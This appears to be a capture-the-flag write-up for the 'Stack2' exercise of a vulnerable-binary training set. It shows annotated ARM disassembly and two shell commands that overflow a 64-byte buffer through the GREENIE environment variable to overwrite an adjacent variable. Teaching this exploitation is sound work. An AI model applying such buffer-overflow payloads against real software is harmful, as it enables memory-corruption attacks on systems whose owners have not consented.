# Stack2
```
What you will learn

    How environment variables can be set

Goal: modify the GREENIE variable
```

Let's disassemble and reverse the executable.
```asm
000104e4 <main>:
   104e4:	e92d4800 	push	{fp, lr}
   104e8:	e28db004 	add	fp, sp, #4
   
   ; ===========================================
   ; Preparing the stack for the local variables
   ; ===========================================
   104ec:	e24dd050 	sub	sp, sp, #80	; 0x50
   104f0:	e50b0050 	str	r0, [fp, #-80]	; 0xffffffb0
   104f4:	e50b1054 	str	r1, [fp, #-84]	; 0xffffffac
   
   ; ===========================================
   ; getenv("GREENIE) and checking if it's set
   ; ===========================================
   104f8:	e59f006c 	ldr	r0, [pc, #108]	; 1056c <main+0x88>
   104fc:	ebffff9c 	bl	10374 <getenv@plt>
   10500:	e50b0008 	str	r0, [fp, #-8]
   10504:	e51b3008 	ldr	r3, [fp, #-8]
   10508:	e3530000 	cmp	r3, #0
   1050c:	1a000002 	bne	1051c <main+0x38>
   10510:	e3a00001 	mov	r0, #1
   10514:	e59f1054 	ldr	r1, [pc, #84]	; 10570 <main+0x8c>
   10518:	ebffffa1 	bl	103a4 <errx@plt>
   
   ; ===========================================
   ; modified=0 and copy GREENIE var to a buffer
   ; ===========================================
   1051c:	e3a03000 	mov	r3, #0
   10520:	e50b300c 	str	r3, [fp, #-12]
   10524:	e24b304c 	sub	r3, fp, #76	; 0x4c
   10528:	e1a00003 	mov	r0, r3
   1052c:	e51b1008 	ldr	r1, [fp, #-8]
   10530:	ebffff8c 	bl	10368 <strcpy@plt>
   
   ; ===========================================
   ;     compare modified to a fixed value
   ; ===========================================
   10534:	e51b300c 	ldr	r3, [fp, #-12]
   10538:	e59f2034 	ldr	r2, [pc, #52]	; 10574 <main+0x90>
   1053c:	e1530002 	cmp	r3, r2
   
   ; ===========================================
   ;  prints a message according to the result
   ; ===========================================
   10540:	1a000002 	bne	10550 <main+0x6c>
   10544:	e59f002c 	ldr	r0, [pc, #44]	; 10578 <main+0x94>
   10548:	ebffff8c 	bl	10380 <puts@plt>
   1054c:	ea000003 	b	10560 <main+0x7c>
   10550:	e51b300c 	ldr	r3, [fp, #-12]
   10554:	e59f0020 	ldr	r0, [pc, #32]	; 1057c <main+0x98>
   10558:	e1a01003 	mov	r1, r3
   1055c:	ebffff7e 	bl	1035c <printf@plt>
   10560:	e1a00003 	mov	r0, r3
   
   10564:	e24bd004 	sub	sp, fp, #4
   10568:	e8bd8800 	pop	{fp, pc}
```
As you may see, _modified_ is stored at _fp-12_ and the buffer is stored at _fp-76_. We can determine that the buffer may contain 64 bytes at most.<br>
So, if we'll fill the buffer with 68, we'll overwrite _modified_ completely.<br>
Just checking:
```sh
$ export GREENIE=`python -c "print 'A'*64 + 'DDDD'"`
$ ./stack2
Try again, you got 0x44444444
```
Great. Now according to gdb, the fixed value _modified_ is compared to is 0xd0a0d0a - which is actually "\n\r\n\r" (little-endian).<br>
```sh
$ export GREENIE=`python -c "print 'A'*64 + '\n\r\n\r'"`
$ ./stack2
you have correctly modified the variable

```

